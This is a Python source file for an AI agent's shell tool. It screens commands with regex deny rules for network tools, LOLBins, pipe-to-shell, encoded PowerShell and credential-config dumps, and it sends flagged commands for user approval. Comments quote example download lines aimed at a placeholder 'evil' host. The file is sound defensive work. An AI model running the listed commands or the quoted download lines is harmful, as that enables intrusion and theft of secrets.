# tools/run_shell.py
"""run_shell  единственный путь запустить shell-команду из агента.

поток: риск-анализ командной строки -> проверка политики (core.policy)
approval через UI  subprocess с sandbox-окружением  захват stdout/stderr.

изоляция дочерних процессов: core/sandbox.py + core/childsandbox/sitecustomize.py.
всё, что прошло фильтр, считается безопасным и выполняется без вопросов;
подозрительные конструкции уходят в approval с понятной причиной."""
import os
import re
import subprocess
import tempfile

from core import policy, sandbox

DEFAULT_ENCODINGS = "utf-8,cp866,cp1251"


# ---------------------------------------------------------------------------
# риск-анализ команды
# ---------------------------------------------------------------------------
# задача: отсеять ОЧЕВИДНЫЕ побеги из песочницы (абсолютные пути, env,
# сеть, чужие шеллы, inline-код, LOLBin'ы, дампы env/конфигов).
# всё, что прошло фильтр, считается безопасным и выполняется без вопросов.
#
# отдельно: `python script.py` разрешён как есть. Изоляция самого скрипта
# делается не на уровне командной строки, а через child_env() —
# он кладёт sitecustomize.py на PYTHONPATH дочернего интерпретатора.

_SUSPICIOUS: list[tuple[re.Pattern, str]] = [
    # --- URL-схемы с исполнением кода: ставим ПЕРВЫМИ ----------------------
    # иначе `mshta javascript:...` или `mshta http://evil` перехватывается
    # generic-правилом путей и причина в логе врёт.
    (re.compile(r'\b(?:javascript|vbscript|data|about|res|ms-its):', re.I),
     "script URL scheme (javascript:/vbscript:/data:/about:)"),
    # --- сеть / LOLBin'ы: до правил путей ------------------------------------
    # иначе `certutil -urlcache -f http://evil p.exe` ловится как
    # `absolute path`/UNC и настоящая причина в логе теряется.
    (re.compile(r'\bcertutil\b[^\r\n]*?\s-(?:decode|encode|urlcache|'
                r'verifyctl|ping)', re.I),
     "certutil payload decode/urlcache"),
    (re.compile(r'\b(?:curl|wget|iwr|irm|Invoke-WebRequest|'
                r'Invoke-RestMethod|bitsadmin|ftp|scp|sftp|ssh|nc|ncat|'
                r'telnet|aria2c|Start-BitsTransfer|certutil)\b', re.I),
     "network/LOLBin tool"),
    (re.compile(r'\b(?:reg(?:\.exe)?\s+(?:add|delete|import|export|save|'
                r'restore|load|unload|query|copy)|regedit|schtasks|'
                r'net\s+(?:user|localgroup|group|share|view|use|config|'
                r'stop|start)|wmic|diskpart|format|takeown|icacls|bcdedit|'
                r'taskkill|sc(?:\.exe)?\s+(?:create|delete|config|start|stop)|'
                r'whoami|systeminfo|ipconfig|netstat|nslookup|arp|'
                r'quser|qwinsta|assoc|ftype|setx|tasklist)\b', re.I),
     "system cmdlet"),
    # lOLBin'ы с любым разделителем после имени: `mshta,`, `rundll32;`,
    # `regsvr32|`, `wscript)` — пробел/конец строки больше не обязательны.
    (re.compile(r'(?:^|[\s&|;(])(?:start|explorer|rundll32|regsvr32|mshta|wscript|cscript|installutil|msbuild|forfiles)(?:\.exe)?(?=[\s,;|&)]|$)', re.I),
     "shell open/exec LOLBin"),
    (re.compile(r"(?:^|[\s&|;(])(?:del|erase)(?:\s|$)", re.I),
     "delete files (del/erase)"),
    (re.compile(r"(?:^|[\s&|;(])(?:rmdir|rd)(?:\s|$)", re.I),
     "remove dir (rmdir/rd)"),
    (re.compile(r"(?:^|[\s&|;(])move(?:\s|$)", re.I),
     "move files (move)"),
    (re.compile(r"(?:^|[\s&|;(])(?:ren|rename)(?:\s|$)", re.I),
     "rename (ren)"),
    (re.compile(r"\byarn\s+(?:add|remove|install|upgrade)\b", re.I),
     "yarn install"),
    (re.compile(r"\bgit\s+(?:clone|checkout|reset|clean|push|pull|merge|rebase|switch|restore)\b", re.I),
     "git state-changing"),
    (re.compile(r"\b(?:pip|pip3)\s+(?:install|uninstall)\b", re.I),
     "pip install"),
    (re.compile(r"\bnpm\s+(?:install|i|add|remove|uninstall)\b", re.I),
     "npm install"),
    # --- пути за пределы cwd -------------------------------------------------
    (re.compile(r'[A-Za-z]:[\\/]'),
     "absolute path"),
    (re.compile(r'(?:^|[\s"\'=<>|&(])\\[A-Za-z_]'),
     "root-relative path"),              # \Users, \Windows и прочее
    (re.compile(r'(?:^|[\s"\'=<>|&])//[A-Za-z0-9_.$-]'),
     "UNC path"),
    (re.compile(r'(?:^|[\s"\'=<>|&])\\\\[A-Za-z0-9_.$-]'),
     "UNC path (backslash)"),
    (re.compile(r'(?:^|[\s"\'=<>|&])\.\.[\\/]'),
     "parent dir"),
    (re.compile(r'(?:^|\s)cd\s+\.\.'),
     "cd .."),

    # --- env / home expansion ------------------------------------------------
    (re.compile(r'%[A-Za-z_][A-Za-z0-9_]*%'),
     "env %VAR%"),
    (re.compile(r'\$env:', re.I),
     "PowerShell $env:"),
    (re.compile(r'\$\{?[A-Za-z_][A-Za-z0-9_]*\}?'),
     "shell $VAR"),
    (re.compile(r'(?:^|[\s"\'=])~[\\/]'),
     "home ~"),

    # --- альтернативные шеллы и интерпретаторы -------------------------------
    # powershell/pwsh с флагами исполнения кода — ДО generic «alt shell»,
    # чтобы причина в логе была точной. re.I покрывает `PWSh -C`, `-ENC`;
    # `[^\r\n]*?` — любые разделители и сокращения (-c/-command/-e/-en/
    # -enc/-encodedcommand/-f/-file).
    (re.compile(r'\b(?:powershell|pwsh)(?:\.exe)?\b[^\r\n]*?\s-'
                r'(?:c|command|e|en|enc|encodedcommand|f|file)\b', re.I),
     "powershell inline/file code"),
    # `cmd/c`, `cmd /c`, `cmd.exe/C` — пробел после cmd более не обязателен.
    (re.compile(r'\bcmd(?:\.exe)?\s*/[ck]\b', re.I),
     "cmd /c chain"),
    (re.compile(r'\b(?:powershell|pwsh|wsl(?:\.exe)?|'
                r'bash|zsh|dash|ksh)\b', re.I),
     "alt shell"),
    # %COMSPEC% и call — обходные цепочки cmd.exe.
    (re.compile(r'%comspec%', re.I),
     "%COMSPEC% chain"),
    (re.compile(r'(?:^|[\s&|;(])call(?:\s|$)', re.I),
     "call chain"),
    (re.compile(r'\b(?:python3?|py|node|nodejs|ruby|perl|php|deno|bun)'
                r'\s+-[ce]\b', re.I),
     "inline code"),

    # --- прямой запуск скриптовых файлов -------------------------------------
    (re.compile(r'(?:^|[\s&|(])(?:\.?[\\/])?[\w.\-]+\.'
                r'(?:bat|cmd|ps1|vbs|jse|wsf|sh)\b', re.I),
     "direct script execution"),

    # --- системные админ-команды --------------------------------------------

    # --- дамп окружения / directory stack / link -----------------------------
    (re.compile(r'(?:^|[\s&|;(])set(?:[\s&|;)]|$)'),
     "env dump (set)"),
    (re.compile(r'\b(?:pushd|popd)\b', re.I),
     "pushd/popd"),
    (re.compile(r'\bmklink\b', re.I),
     "mklink"),

    # --- циклы cmd с исполнением команд --------------------------------------
    (re.compile(r'\bfor\s*/[fF]\b'),
     "for /f loop"),

    # --- «серые» cmdlet'ы: могут сливать/подменять данные --------------------
    # ловим независимо от флагов: `attrib +h f`, `where python`, `cacls f`,
    # `findstr x f` — сами по себе уже разведка/скрытая модификация.
    (re.compile(r'(?:^|[\s&|;(])(?:where|attrib|cacls|icacls)(?:\.exe)?'
                r'(?=[\s,;|&)]|$)', re.I),
     "gray cmdlet (where/attrib/cacls/icacls)"),

    # --- дампы конфигов с секретами ------------------------------------------
    (re.compile(r'\b(?:git\s+config|pip3?\s+config|npm\s+config|'
                r'yarn\s+config|pnpm\s+config|aws\s+configure|'
                r'kubectl\s+config|gcloud\s+config)\b', re.I),
     "config dump"),


    # --- redirect за пределы cwd ---------------------------------------------
    (re.compile(r'>>?\s*(?:[A-Za-z]:[\\/]|/[A-Za-z])'),
     "redirect absolute"),
    (re.compile(r'>>?\s*\.\.[\\/]'),
     "redirect to parent dir"),
    (re.compile(r'>>'),
     "append redirect"),
]

# отдельное правило: `python -S` / `-I` / `-E` ломает site.py и наш
# sitecustomize. Приходится чекать вместе — «есть python И есть флаг».
_PYTHON_BYPASS = re.compile(
    r'\b(?:python3?|py)(?:\.exe)?\b[^\r\n]*?\s-[SIE](?:\s|$)',
    re.I,
)

_SCRIPT_RUN = re.compile(
    r'(?:^|[\s&|;(])'
    r'(?:python3?(?:\.exe)?|py(?:\.exe)?)\s+'
    r'(?!-[cC])'                      # не -c: это inline, уже ловится
    r'(?:-\S+\s+)*'                   # -u, -O, -X ... — пропускаем
    r'["\']?([^\s"\']+\.py)["\']?',
    re.I,
)

# ищем .py-скрипт в команде
def _script_path(command: str) -> str | None:
    m = _SCRIPT_RUN.search(command)
    return m.group(1) if m else None

# --- структурные правила (работают на ПОЛНОЙ команде) ----------------------
# `&&` и pipe-to-shell  это структура, а не отдельные сегменты.
# применяем к masked-версии, чтобы кавычки внутри не считались оператором.
_QUOTED_RE = re.compile(r"'[^']*'|\"[^\"]*\"")


# прячем содержимое кавычек от regex
def _mask_quotes(s: str) -> str:
    """Заменяет содержимое кавычек пробелами той же длины.

    Нужно, чтобы `echo \"a&&b\"` не считался command chaining:
    `&&` внутри кавычек  это литерал, а не оператор cmd.
    """
    return _QUOTED_RE.sub(lambda m: " " * len(m.group(0)), s)


_SEP_RE = re.compile(r"(&&|\|\||[&|;])")


# режем команду по ; | && для анализа
def _split_segments(command: str) -> list[str]:
    """Разбивает команду по &, |, ; ВНЕ кавычек.

    Разделители остаются отдельными элементами. Каждый сегмент
    классифицируется отдельно  так `del a.txt & echo hi` ловит `del`.
    """
    masked = _mask_quotes(command)
    parts: list[str] = []
    last = 0
    for m in _SEP_RE.finditer(masked):
        if m.start() > last:
            parts.append(command[last:m.start()])
        parts.append(command[m.start():m.end()])
        last = m.end()
    if last < len(command):
        parts.append(command[last:])
    return [p for p in parts if p]


# pipe-to-shell: точная причина, проверяем ПЕРВОЙ.
# обычный `|` (echo a | findstr) здесь не ловится  это не угроза.
_SUSPICIOUS_STRUCTURAL: list[tuple[re.Pattern, str]] = [
    (re.compile(r"\|\s*(?:bash|sh|zsh|pwsh|powershell|cmd|iex|"
                r"Invoke-Expression)\b", re.I),
     "pipe to shell"),
]

# `&&`/`||`  ФОЛБЭК: если в сегментах ничего не нашли, но
# цепочка есть,  это всё равно подозрительно (echo hi || dir).
_CHAINING_RE = re.compile(r"&&|\|\|")


# нормализация перед классификацией
def _normalize(command: str) -> str:
    """Снимает cmd-обфускацию, чтобы regex видел реальную команду.

    cmd.exe трактует `^` как escape: `d^el foo` == `del foo`. Без
    нормализации посимвольные правила обходятся вставкой `^` между
    буквами. Схлопываем и кратные пробелы. `%VAR%` не раскрываем —
    он уже ловится отдельным правилом.
    """
    if not command:
        return command
    out = command.replace("^", "")
    # cmd-трюк: d"el -> del. Убираем кавычки вокруг одиночной буквы.
    out = re.sub(r'(?<=[A-Za-z])"([A-Za-z])(?=[A-Za-z])', r"\1", out)
    out = re.sub(r"[ \t]+", " ", out)
    return out


# риск-анализ: причина или None
def _classify(command: str) -> str | None:
    """Возвращает короткую причину, если команда подозрительна, иначе None.

    Двухфазный проход:
      1. Структурные правила (&&, ||, pipe-to-shell)  на ПОЛНОЙ
         команде с замаскированными кавычками. `echo \"a&&b\"`  ок.
      2. Остальные правила  по СЕГМЕНТАМ, разбитым по &|; вне кавычек.
         `del a.txt & echo` ловит `del` в первом сегменте.
    """
    norm = _normalize(command)

    # фаза 1: pipe-to-shell (точная структурная причина).
    for cand in {command, norm}:
        masked = _mask_quotes(cand)
        for pat, reason in _SUSPICIOUS_STRUCTURAL:
            if pat.search(masked):
                return reason

    # фаза 2: посегментно. `del a.txt && echo` ловит `del`
    # конкретная причина важнее общей `command chaining`.
    segments = _split_segments(norm) or [norm]
    for seg in segments:
        for pat, reason in _SUSPICIOUS:
            if pat.search(seg):
                return reason

    # фаза 3: фолбэк  chaining без конкретной причины.
    for cand in {command, norm}:
        if _CHAINING_RE.search(_mask_quotes(cand)):
            return "command chaining"

    if _PYTHON_BYPASS.search(norm):
        return "python isolated mode (-S/-I/-E)"
    if _SCRIPT_RUN.search(norm):
        return "execute python script"
    return None


# ---------------------------------------------------------------------------
# декодирование вывода
# ---------------------------------------------------------------------------

# кодировки для декода вывода
def _candidates() -> list[str]:
    """Порядок кодировок для декодирования вывода shell-команды.

    utf-8 первым — покрывает случай `chcp 65001` и наши Python-скрипты
    (мы ставим им PYTHONIOENCODING). cp866/cp1251 — фолбэк для нативных
    утилит cmd.exe.
    """
    raw = os.getenv("MATRIXCODE_SHELL_ENCODINGS", DEFAULT_ENCODINGS)
    seen = set()
    out: list[str] = []
    for part in raw.split(","):
        enc = part.strip()
        if enc and enc not in seen:
            seen.add(enc)
            out.append(enc)
    return out or ["utf-8"]


# пробуем кодировки по очереди
def _decode(data: bytes) -> str:
    if not data:
        return ""
    for enc in _candidates():
        try:
            return data.decode(enc)
        except (UnicodeDecodeError, LookupError):
            continue
    return data.decode("utf-8", errors="replace")


# ---------------------------------------------------------------------------
# основной тул
# ---------------------------------------------------------------------------

# shell-команда под sandbox с approval
def run_shell(command: str, timeout: int = 30) -> str:
    """Запускает shell-команду с предварительной проверкой на риск.

    Каждый `python script.py` уходит в approval. Причина содержит
    полный текст скрипта — чтобы пользователь видел, что именно
    будет исполнено. Причина: Python-sandbox покрывает builtins.open,
    но НЕ покрывает _winapi.CopyFile2 / ctypes / C-extension'ы.
    Скрипт — единственное место, где всё это доступно из одной строки.
    """
    reason = _classify(command)

    # профиль политики: может превратить нет reason в approval
    # (strict) или снять шум (dev). safe-профиль отвергает всё,
    # минуя диалог  см. policy.safe_mode().
    if policy.safe_mode():
        return (f"error: user denied approval for: {command}\n"
                f"reason: safe policy profile  no command allowed\n"
                "Do NOT retry the same command. Use a safe alternative.")

    if policy.strict_mode() and reason is None:
        head = (command.strip().split() or [""])[0].lower()
        if head not in policy.strict_allowlist():
            reason = f"strict policy: {head or 'command'} not in allowlist"

    if reason is not None and not policy.should_prompt(reason):
        reason = None  # dev-профиль: этот reason не требует диалога

    if reason is not None:
        # для скриптов читаем содержимое, чтобы оно попало в approval.
        extra = ""
        sp = _script_path(command)
        if sp is not None:
            try:
                from pathlib import Path
                p = Path(sp)
                if not p.is_absolute():
                    p = Path.cwd() / p
                text = p.read_text(encoding="utf-8",
                                   errors="replace")[:2000]
                extra = f"\n--- {sp} ---\n{text}\n--- end ---"
            except Exception as e:
                extra = f"\n[не удалось прочитать {sp}: {e}]"

        allowed = sandbox._request_access(
            command, "run_shell", reason + extra)
        if not allowed:
            return (f"error: user denied approval for: {command}\n"
                    f"reason: {reason}\n"
                    "Do NOT retry the same command. Use a safe alternative.")
    env = sandbox.child_env()
    env["PYTHONIOENCODING"] = "utf-8"
    env["PYTHONUTF8"] = "1"

    out_f = tempfile.TemporaryFile()  # noqa: SIM115
    err_f = tempfile.TemporaryFile()  # noqa: SIM115
    try:
        try:
            proc = subprocess.run(
                command,
                shell=True,
                stdout=out_f,
                stderr=err_f,
                timeout=timeout,
                env=env,
            )
        except subprocess.TimeoutExpired:
            return f"[timeout after {timeout}s]"

        out_f.seek(0)
        err_f.seek(0)
        out = _decode(out_f.read())
        err = _decode(err_f.read())
    finally:
        for f in (out_f, err_f):
            try:
                f.close()
            except Exception:
                pass

    parts: list[str] = []
    if out.strip():
        parts.append(out.rstrip())
    if err.strip():
        parts.append("[stderr]\n" + err.rstrip())
    parts.append(f"[exit={proc.returncode}]")
    return "\n".join(parts)


def register(registry):
    registry.add(
        "run_shell",
        '<call- run_shell: command:"dir" timeout:30 -call>\n'
        "Runs a shell command and returns stdout+stderr+exit code. "
        "Output is truncated by the host if too long.\n"
        "Safe commands (dir, type file.txt, python script.py) run "
        "immediately. Commands that touch absolute paths, environment "
        "variables, network, non-cmd shells, LOLBins, or dump env/config "
        "require user approval.\n"
        "Args: command (string, required), timeout (int seconds, default 30).\n"
        "Result: <result>output here</result>",
        run_shell,
    )
